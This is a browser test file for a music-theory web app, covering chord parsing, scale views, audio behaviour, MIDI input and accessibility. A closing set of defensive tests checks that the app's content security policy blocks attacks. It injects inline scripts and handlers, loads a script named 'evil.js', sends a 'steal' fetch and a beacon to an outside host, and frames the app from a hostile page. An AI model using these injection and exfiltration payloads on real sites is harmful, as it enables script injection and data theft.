// Browser tests: the app served under its real security headers.
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { chromium } from 'playwright';
import { startServer } from './serve.mjs';

let server;
let browser;
before(async () => { server = await startServer(); browser = await chromium.launch(); });
after(async () => { await browser?.close(); await server?.close(); });

async function open(path = '/', { init, initArg } = {}) {
  const page = await browser.newPage();
  page.setDefaultTimeout(5000);
  const problems = [];
  page.on('console', (m) => { if (/Content Security Policy|Refused to/.test(m.text())) problems.push(m.text()); });
  page.on('pageerror', (e) => problems.push(String(e)));
  if (init) await page.addInitScript(init, initArg);
  await page.goto(server.url + path);
  await page.waitForFunction(() => document.getElementById('tonic')?.textContent.length > 0, null, { timeout: 5000 });
  return { page, problems };
}

async function enterChord(page, text) {
  await page.fill('#chord-text', text);
  await page.press('#chord-text', 'Enter');
}

test('the app loads cleanly under the CSP', async () => {
  const { page, problems } = await open();
  assert.deepEqual(problems, []);
  assert.equal(await page.isVisible('#view-practice'), true);
  await page.close();
});

test('typing Dm7 shows F Lydian', async () => {
  const { page } = await open();
  await enterChord(page, 'Dm7');
  assert.match(await page.textContent('#tonic'), /F/);
  assert.equal((await page.textContent('#parent-notes')).trim(), 'F G A B C D E');
  await page.close();
});

test('a bad chord shows a message and keeps the last good one', async () => {
  const { page } = await open();
  await enterChord(page, 'Dm7');
  await enterChord(page, 'H7');
  assert.match(await page.textContent('#chord-error'), /“H”/);
  assert.match(await page.textContent('#tonic'), /F/);
  await page.close();
});

test('flat chords stay flat', async () => {
  const { page } = await open();
  await enterChord(page, 'Gb7');
  assert.match(await page.textContent('#tonic'), /F♭/);
  await page.close();
});

test('the app works when storage is blocked', async () => {
  const { page, problems } = await open('/', {
    init: () => { Object.defineProperty(window, 'localStorage', { get() { throw new Error('blocked'); } }); },
  });
  assert.deepEqual(problems, []);
  assert.equal(await page.inputValue('#chord-text'), 'Cmaj7');
  assert.match(await page.textContent('#tonic'), /^\s*C\s*$/);
  await page.close();
});

test('a corrupt saved chord falls back to Cmaj7', async () => {
  const { page } = await open('/', { init: () => { try { localStorage.setItem('lce.chord', '"zzz"'); } catch {} } });
  assert.equal(await page.inputValue('#chord-text'), 'Cmaj7');
  await page.close();
});

test('pressing Play twice then Stop leaves silence', async () => {
  const { page } = await open();
  await page.click('#play-scale');
  await page.click('#play-scale');
  await page.click('#stop');
  await page.waitForFunction(() => document.getElementById('live').textContent === 'Stopped');
  assert.equal(await page.getAttribute('#play-scale', 'aria-pressed'), 'false');
  await page.close();
});

test('the keyboard can be reached and walked with arrow keys', async () => {
  const { page } = await open();
  await page.focus('#chord-text');
  assert.equal(await page.evaluate(() => document.activeElement.id), 'chord-text');
  await page.locator('#keyboard [role="button"][tabindex="0"]').focus();
  const first = await page.evaluate(() => document.activeElement.getAttribute('aria-label'));
  await page.keyboard.press('ArrowRight');
  const second = await page.evaluate(() => document.activeElement.getAttribute('aria-label'));
  assert.notEqual(first, second);
  assert.match(second, /^[A-G]/);
  await page.close();
});

test('the gravity circle shows twelve tones in order from the tonic', async () => {
  const { page, problems } = await open('/#gravity');
  assert.equal(await page.isVisible('#view-gravity'), true);
  assert.equal(await page.locator('#gravity-circle .gnode').count(), 12);
  const first = await page.locator('#gravity-circle .gnode[data-rank="1"]').getAttribute('aria-label');
  assert.match(first, /^C\b/);
  assert.equal(await page.locator('#gravity-table tbody tr').count(), 12);
  assert.deepEqual(problems, []);
  await page.close();
});

test('arrow keys walk the gravity order and Enter explains a tone', async () => {
  const { page } = await open('/#gravity');
  await page.locator('#gravity-circle .gnode[tabindex="0"]').focus();
  await page.keyboard.press('ArrowRight');
  await page.keyboard.press('Enter');
  assert.match(await page.textContent('#gravity-note'), /rank 2 of 12/);
  await page.close();
});

test('the gravity tonic follows the Practice chord', async () => {
  const { page } = await open();
  await enterChord(page, 'Dm7');
  await page.click('#tab-gravity');
  const first = await page.locator('#gravity-circle .gnode[data-rank="1"]').getAttribute('aria-label');
  assert.match(first, /^F\b/);
  await page.close();
});

test('reference search filters the glossary as you type', async () => {
  const { page, problems } = await open('/#reference');
  const total = await page.locator('#glossary .gloss').count();
  assert.ok(total >= 15);
  await page.fill('#ref-search', 'gravity');
  const visible = page.locator('#glossary .gloss:visible');
  const count = await visible.count();
  assert.ok(count >= 1 && count < total);
  for (const text of await visible.allTextContents()) assert.match(text, /gravity/i);
  assert.match(await page.textContent('#ref-count'), /\d+/);
  await page.fill('#ref-search', '');
  assert.equal(await page.locator('#glossary .gloss:visible').count(), total);
  assert.deepEqual(problems, []);
  await page.close();
});

test('the chord table lists verified chords and the book citation is there', async () => {
  const { page } = await open('/#reference');
  assert.ok(await page.locator('#chord-table tbody tr').count() >= 12);
  assert.match(await page.textContent('#chord-table'), /Dm7|Cm7/);
  assert.match(await page.textContent('#sources-list'), /Concept Publishing, 2001/);
  assert.ok(await page.locator('#pending-list li').count() >= 1);
  await page.close();
});

test('every view reflows to a 320 px screen without sideways scrolling', async () => {
  const page = await browser.newPage({ viewport: { width: 320, height: 800 } });
  for (const hash of ['', '#gravity', '#reference']) {
    await page.goto(`${server.url}/${hash}`);
    await page.waitForFunction(() => document.getElementById('tonic')?.textContent.length > 0);
    assert.equal(await page.evaluate(() => document.documentElement.scrollWidth), 320, hash || '#practice');
  }
  await page.close();
});

test('scale cards have a short name and a description', async () => {
  const { page } = await open();
  const card = page.locator('.ladder-card').first();
  const name = await card.evaluate((el) => el.getAttribute('aria-labelledby').split(' ').map((id) => document.getElementById(id).textContent).join(' '));
  assert.match(name, /^1 C Lydian$/);
  const desc = await card.evaluate((el) => el.getAttribute('aria-describedby').split(' ').map((id) => document.getElementById(id).textContent).join(' '));
  assert.match(desc, /C D E F♯ G A B/);
  assert.equal(await page.locator('#tonic[aria-label]').count(), 0);
  await page.close();
});

test('stopping a note before it sounds does not blip', async () => {
  const { page } = await open();
  const peaks = await page.evaluate(async () => {
    const { createEngine } = await import('/js/audio/engine.js');
    async function peak(stopEarly) {
      class Offline extends OfflineAudioContext {
        constructor() { super(1, 44100, 44100); }
        get state() { return 'running'; }
      }
      const engine = createEngine({ AudioContextCtor: Offline, volume: 1 });
      await engine.resume();
      engine.note(60, 0.1, 0.5);
      if (stopEarly) engine.stopAll();
      const ctx = engine.context();
      const data = (await ctx.startRendering()).getChannelData(0);
      return data.reduce((m, v) => Math.max(m, Math.abs(v)), 0);
    }
    return { normal: await peak(false), stopped: await peak(true) };
  });
  assert.ok(peaks.stopped <= peaks.normal + 0.01, JSON.stringify(peaks));
  await page.close();
});

test('the skip link does not change the view', async () => {
  const { page } = await open('/#gravity');
  await page.keyboard.press('Tab');
  assert.equal(await page.evaluate(() => document.activeElement.id), 'skip');
  await page.keyboard.press('Enter');
  await page.waitForTimeout(100);
  assert.equal(await page.isVisible('#view-gravity'), true);
  await page.close();
});

test('playing state stays true across views', async () => {
  const { page } = await open();
  await page.click('#play-scale');
  await page.click('#tab-gravity');
  await page.locator('#gravity-circle .gnode[data-rank="3"]').click();
  assert.match(await page.textContent('#gravity-status'), /Drone on C/);
  await page.click('#tab-practice');
  assert.equal(await page.getAttribute('#play-scale', 'aria-pressed'), 'false');
  assert.equal(await page.getAttribute('#drone', 'aria-pressed'), 'true');
  assert.match(await page.textContent('#now-playing'), /Drone on C/);
  await page.click('#stop');
  assert.match(await page.textContent('#gravity-status'), /Silent/);
  await page.close();
});

test('a new chord is announced to screen readers', async () => {
  const { page } = await open();
  await enterChord(page, 'Dm7');
  await page.waitForFunction(() => /Lydian tonic F\b/.test(document.getElementById('live').textContent));
  await page.close();
});

test('changing the chord type keeps the typed root spelling', async () => {
  const { page } = await open();
  await enterChord(page, 'C#m7');
  await page.selectOption('#chord-quality', 'maj7');
  assert.equal(await page.inputValue('#chord-text'), 'C#maj7');
  await page.close();
});

test('no key flashes after Stop', async () => {
  const { page } = await open();
  await page.$eval('#bpm', (el) => { el.value = '200'; el.dispatchEvent(new Event('input')); });
  await page.click('#play-scale');
  await page.waitForTimeout(500);
  await page.click('#stop');
  await page.waitForTimeout(150);
  assert.equal(await page.locator('#keyboard .is-sounding').count(), 0);
  await page.close();
});

test('the now-playing line follows a tempo change', async () => {
  const { page } = await open();
  await page.click('#play-scale');
  await page.$eval('#bpm', (el) => { el.value = '120'; el.dispatchEvent(new Event('input')); });
  assert.match(await page.textContent('#now-playing'), /120 bpm/);
  await page.click('#stop');
  await page.close();
});

test('keys do not flash at all when motion is reduced', async () => {
  const { page } = await open();
  await page.emulateMedia({ reducedMotion: 'reduce' });
  await page.evaluate(() => {
    window.__flashes = 0;
    new MutationObserver((list) => { for (const m of list) if (m.target.classList?.contains('is-sounding')) window.__flashes += 1; })
      .observe(document.getElementById('keyboard'), { subtree: true, attributes: true, attributeFilter: ['class'] });
  });
  await page.click('#play-scale');
  await page.waitForTimeout(900);
  await page.click('#stop');
  assert.equal(await page.evaluate(() => window.__flashes), 0);
  await page.close();
});

test('the Gravity picker shows a tonic spelled outside the twelve roots', async () => {
  const { page } = await open();
  await enterChord(page, 'Gb7');
  await page.click('#tab-gravity');
  assert.equal(await page.$eval('#gravity-tonic', (el) => el.selectedOptions[0].textContent), 'F♭');
  await page.close();
});

test('a drone sounds until stopAll, then falls silent (real audio graph)', async () => {
  const { page } = await open();
  const energy = await page.evaluate(async () => {
    const { createEngine } = await import('/js/audio/engine.js');
    class Offline extends OfflineAudioContext {
      constructor() { super(1, 44100, 44100); }
      get state() { return 'running'; }
    }
    const engine = createEngine({ AudioContextCtor: Offline, volume: 1 });
    await engine.resume();
    const ctx = engine.context();
    engine.drone([48, 55]);
    ctx.suspend(0.5).then(() => { engine.stopAll(); ctx.resume(); });
    const data = (await ctx.startRendering()).getChannelData(0);
    const rms = (a, b) => Math.sqrt(data.slice(a * 44100, b * 44100).reduce((s, v) => s + v * v, 0) / ((b - a) * 44100));
    return { during: rms(0.1, 0.4), after: rms(0.8, 1) };
  });
  assert.ok(energy.during > 0.01, JSON.stringify(energy));
  assert.ok(energy.after < 0.0005, JSON.stringify(energy));
  await page.close();
});

test('a note sounds like a struck electric-piano key: bright attack that mellows and fades', async () => {
  const { page } = await open();
  const shape = await page.evaluate(async () => {
    const { createEngine } = await import('/js/audio/engine.js');
    class Offline extends OfflineAudioContext {
      constructor() { super(1, 44100, 44100); }
      get state() { return 'running'; }
    }
    const engine = createEngine({ AudioContextCtor: Offline, volume: 1 });
    await engine.resume();
    engine.note(57, 0, 1);
    const x = (await engine.context().startRendering()).getChannelData(0);
    const win = (a, b) => x.subarray(Math.round(a * 44100), Math.round(b * 44100));
    const rms = (a, b) => { const w = win(a, b); return Math.sqrt(w.reduce((s, v) => s + v * v, 0) / w.length); };
    // Brightness: energy of the sample-to-sample change relative to the signal's energy.
    const bright = (a, b) => { const w = win(a, b); let d = 0, e = 0; for (let i = 1; i < w.length; i++) { d += (w[i] - w[i - 1]) ** 2; e += w[i] ** 2; } return d / e; };
    return { early: rms(0.01, 0.06), late: rms(0.5, 0.6), brightEarly: bright(0.01, 0.06), brightLate: bright(0.5, 0.6) };
  });
  assert.ok(shape.early > 0.02, JSON.stringify(shape));
  assert.ok(shape.brightEarly > shape.brightLate * 1.5, `attack should be brighter than the ring: ${JSON.stringify(shape)}`);
  assert.ok(shape.late < shape.early, `should fade: ${JSON.stringify(shape)}`);
  assert.ok(shape.late > shape.early * 0.05, `should still ring: ${JSON.stringify(shape)}`);
  await page.close();
});

test('clicking a scale card selects it without playing', async () => {
  const { page } = await open();
  await page.locator('.ladder-card').nth(1).click();
  assert.equal(await page.getAttribute('.ladder-card >> nth=1', 'aria-pressed'), 'true');
  assert.match(await page.textContent('#selected-scale'), /Lydian Augmented/);
  assert.equal(await page.getAttribute('#play-scale', 'aria-pressed'), 'false');
  assert.match(await page.textContent('#now-playing'), /Silent/);
  await page.click('#play-scale');
  assert.match(await page.textContent('#now-playing'), /Lydian Augmented/);
  await page.click('#stop');
  await page.close();
});

test('scale cards show the notes from the chord root, with the familiar mode name', async () => {
  const { page } = await open();
  await enterChord(page, 'Cm7');
  const first = page.locator('.ladder-card').first();
  assert.match(await first.textContent(), /From C: C D E♭ F G A B♭ · C Dorian/);
  await page.selectOption('#start-on', 'root');
  await page.click('#play-scale');
  assert.match(await page.textContent('#now-playing'), /E♭ Lydian from C \(C Dorian\)/);
  await page.click('#stop');
  await page.close();
});

// ---------- MIDI (simulated keyboard) ----------

// Runs inside the page: Playwright passes only the function's text, so
// options arrive as its argument (initArg), not from the test's scope.
const fakeMidi = ({ reject = false } = {}) => {
  window.__midiRequested = false;
  const input = { name: 'Test Keys', onmidimessage: null };
  const access = { inputs: new Map([['k', input]]), onstatechange: null };
  navigator.requestMIDIAccess = async (opts) => {
    window.__midiRequested = true;
    window.__midiOpts = opts;
    if (reject) throw new DOMException('denied', 'NotAllowedError');
    return access;
  };
  const send = (data) => input.onmidimessage?.({ data: Uint8Array.from(data) });
  let down = [];
  window.__midi = {
    play(notes) { down.forEach((n) => send([0x80, n, 0])); down = notes; notes.forEach((n) => send([0x90, n, 100])); },
    release() { down.forEach((n) => send([0x80, n, 0])); down = []; },
  };
};

test('MIDI: nothing is requested until Connect is pressed', async () => {
  const { page } = await open('/', { init: fakeMidi });
  await page.waitForTimeout(300);
  assert.equal(await page.evaluate(() => window.__midiRequested), false);
  assert.match(await page.textContent('#midi-status'), /MIDI is off/);
  await page.close();
});

test('MIDI: hold a chord on the keyboard and it becomes the chord', async () => {
  const { page, problems } = await open('/', { init: fakeMidi });
  await page.click('#midi-connect');
  await page.waitForFunction(() => /Listening to Test Keys/.test(document.getElementById('midi-status').textContent));
  assert.deepEqual(await page.evaluate(() => window.__midiOpts), { sysex: false });
  assert.equal(await page.getAttribute('#midi-connect', 'aria-pressed'), 'true');
  await page.evaluate(() => window.__midi.play([62, 65, 69, 72]));
  await page.waitForFunction(() => document.getElementById('chord-text').value === 'Dm7');
  assert.match(await page.textContent('#tonic'), /F/);
  assert.match(await page.textContent('#midi-heard'), /Dm7/);
  await page.evaluate(() => window.__midi.release());
  await page.waitForTimeout(300);
  assert.equal(await page.inputValue('#chord-text'), 'Dm7');
  await page.evaluate(() => window.__midi.play([60, 62, 64, 65]));
  await page.waitForFunction(() => /isn't a chord I know yet/.test(document.getElementById('midi-heard').textContent));
  assert.equal(await page.inputValue('#chord-text'), 'Dm7');
  await page.click('#midi-disconnect');
  assert.match(await page.textContent('#midi-status'), /MIDI is off/);
  assert.equal(await page.getAttribute('#midi-connect', 'aria-pressed'), 'false');
  assert.deepEqual(problems, []);
  await page.close();
});

test('MIDI: striking the same chord again does not restart or re-announce', async () => {
  const { page } = await open('/', { init: fakeMidi });
  await page.click('#midi-connect');
  await page.waitForFunction(() => /Listening/.test(document.getElementById('midi-status').textContent));
  await page.evaluate(() => window.__midi.play([62, 65, 69, 72]));
  await page.waitForFunction(() => /Lydian tonic F/.test(document.getElementById('live').textContent));
  await page.evaluate(() => {
    window.__liveChanges = 0;
    new MutationObserver(() => { window.__liveChanges += 1; }).observe(document.getElementById('live'), { childList: true, characterData: true, subtree: true });
  });
  await page.evaluate(() => { window.__midi.release(); window.__midi.play([62, 65, 69, 72]); });
  await page.waitForTimeout(600);
  assert.equal(await page.evaluate(() => window.__liveChanges), 0);
  await page.close();
});

test('MIDI: one clear announcement per chord, and the heard line is not a second live region', async () => {
  const { page } = await open('/', { init: fakeMidi });
  assert.equal(await page.getAttribute('#midi-heard', 'aria-live'), null);
  await page.click('#midi-connect');
  await page.waitForFunction(() => /Listening/.test(document.getElementById('midi-status').textContent));
  await page.click('#play-scale');
  await page.evaluate(() => window.__midi.play([55, 59, 62, 65]));
  await page.waitForFunction(() => /G7: Lydian tonic F/.test(document.getElementById('live').textContent));
  assert.match(await page.textContent('#live'), /Playing F Lydian/);
  await page.evaluate(() => window.__midi.play([60, 62, 64, 65]));
  await page.waitForFunction(() => /isn't a chord I know yet/.test(document.getElementById('live').textContent));
  await page.click('#stop');
  await page.close();
});

test('MIDI: the button label stays fixed; its pressed state tells the story', async () => {
  const { page } = await open('/', { init: fakeMidi });
  await page.click('#midi-connect');
  await page.waitForFunction(() => /Listening/.test(document.getElementById('midi-status').textContent));
  assert.match(await page.textContent('#midi-connect'), /Connect MIDI keyboard/);
  assert.equal(await page.getAttribute('#midi-connect', 'aria-describedby'), null);
  await page.close();
});

test('MIDI: the Connect button is a true toggle', async () => {
  const { page } = await open('/', { init: fakeMidi });
  await page.click('#midi-connect');
  await page.waitForFunction(() => /Listening/.test(document.getElementById('midi-status').textContent));
  await page.click('#midi-connect');
  assert.match(await page.textContent('#midi-status'), /MIDI is off/);
  assert.equal(await page.getAttribute('#midi-connect', 'aria-pressed'), 'false');
  await page.close();
});

test('MIDI: a browser without Web MIDI gets a helpful note', async () => {
  const { page } = await open('/', { init: () => { delete Navigator.prototype.requestMIDIAccess; delete navigator.requestMIDIAccess; } });
  await page.click('#midi-connect');
  await page.waitForFunction(() => /isn't available in this browser/.test(document.getElementById('midi-status').textContent));
  await page.close();
});

test('MIDI: a declined permission is explained', async () => {
  const { page } = await open('/', { init: fakeMidi, initArg: { reject: true } });
  await page.click('#midi-connect');
  await page.waitForFunction(() => /Permission was declined/.test(document.getElementById('midi-status').textContent));
  await page.close();
});

// ---------- Attack tests: the policy must stop these ----------

test('injected inline scripts and handlers do not run', async () => {
  const { page, problems } = await open();
  await page.evaluate(() => {
    const s = document.createElement('script');
    s.textContent = 'window.__x = 1';
    document.body.append(s);
    const img = document.createElement('img');
    img.setAttribute('src', 'data:,x');
    img.setAttribute('onerror', 'window.__y = 1');
    document.body.append(img);
    const div = document.createElement('div');
    div.innerHTML = '<img src="nope.png" onerror="window.__z = 1">';
    document.body.append(div);
  });
  await page.waitForTimeout(300);
  assert.equal(await page.evaluate(() => window.__x), undefined);
  assert.equal(await page.evaluate(() => window.__y), undefined);
  assert.equal(await page.evaluate(() => window.__z), undefined);
  assert.ok(problems.some((p) => /Content Security Policy/.test(p)));
  await page.close();
});

test('scripts from other sites are refused', async () => {
  const { page } = await open();
  const loaded = await page.evaluate(() => new Promise((resolve) => {
    const s = document.createElement('script');
    s.src = 'https://example.com/evil.js';
    s.onload = () => resolve(true);
    s.onerror = () => resolve(false);
    document.head.append(s);
  }));
  assert.equal(loaded, false);
  await page.close();
});

test('the page cannot send data anywhere', async () => {
  const { page, problems } = await open();
  const outbound = [];
  page.on('request', (r) => { if (!r.url().startsWith(server.url)) outbound.push(r.url()); });
  const outcome = await page.evaluate(async () => {
    try { await fetch('https://example.com/steal?x=1'); return 'sent'; } catch { return 'blocked'; }
  });
  assert.equal(outcome, 'blocked');
  // sendBeacon reports true when it queues; what matters is that nothing leaves.
  await page.evaluate(() => { try { navigator.sendBeacon('https://example.com/b', 'x'); } catch {} });
  await page.waitForTimeout(400);
  assert.deepEqual(outbound.filter((u) => !u.startsWith('data:')), []);
  assert.ok(problems.some((p) => /connect-src/.test(p)));
  await page.close();
});

test('another site cannot frame the app', async () => {
  const { createServer } = await import('node:http');
  const evil = createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`<!doctype html><iframe id="f" src="${server.url}/"></iframe>`);
  });
  await new Promise((r) => evil.listen(0, '127.0.0.1', r));
  const page = await browser.newPage();
  try {
    await page.goto(`http://localhost:${evil.address().port}/`);
    await page.waitForTimeout(800);
    const frame = page.frames().find((f) => f !== page.mainFrame());
    const inside = frame ? await frame.$('#tonic').catch(() => null) : null;
    assert.equal(inside, null);
  } finally {
    await page.close();
    await new Promise((r) => evil.close(r));
  }
});
